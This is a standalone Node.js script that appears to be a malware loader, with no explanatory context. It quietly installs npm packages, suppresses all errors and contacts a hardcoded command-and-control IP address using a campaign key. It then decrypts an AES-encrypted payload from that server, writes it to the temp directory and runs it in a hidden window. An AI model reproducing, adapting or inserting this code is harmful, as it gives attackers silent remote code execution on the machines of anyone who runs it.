try {
  const childProcess = require("child_process");
  const crypto = require("crypto");
  const fs = require("fs");
  const os = require("os");
  const path = require("path");

  const execSync = childProcess.execSync;

  execSync(
    "npm install axios socket.io-client --no-warnings --no-progress --loglevel silent",
    {
      cwd: os.tmpdir(),
      windowsHide: true,
    }
  );

  const axios = require("axios");

  process.on("uncaughtException", () => {});
  process.on("unhandledRejection", () => {});

  const campaignKey = "aa70fc4445d73114c1b9ad081019ed20";
  const c2Address = "194.156.90.241";
  const c2Url =
    `http://${c2Address}/api/service/${campaignKey}`;

  const aesKey = crypto.scryptSync(
    campaignKey,
    "salt",
    32
  );

  axios
    .get(c2Url)
    .then((response) => {
      try {
        // Expected response:
        // base64_iv:base64_ciphertext
        const [ivBase64, ciphertextBase64] =
          response.data.split(":");

        const decipher = crypto.createDecipheriv(
          "aes-256-cbc",
          aesKey,
          Buffer.from(ivBase64, "base64")
        );

        const payloadSource =
          decipher.update(
            ciphertextBase64,
            "base64",
            "utf8"
          ) +
          decipher.final("utf8");

        const outputPath = path.join(
          os.tmpdir(),
          "pack"
        );

        fs.writeFileSync(
          outputPath,
          payloadSource,
          { flag: "w+" }
        );

        execSync("node pack", {
          cwd: path.join(os.tmpdir()),
          windowsHide: true,
        });
      } catch (_) {
        // Deliberately ignored.
      }
    })
    .catch(() => {});
} catch (_) {
  // Deliberately ignored.
}
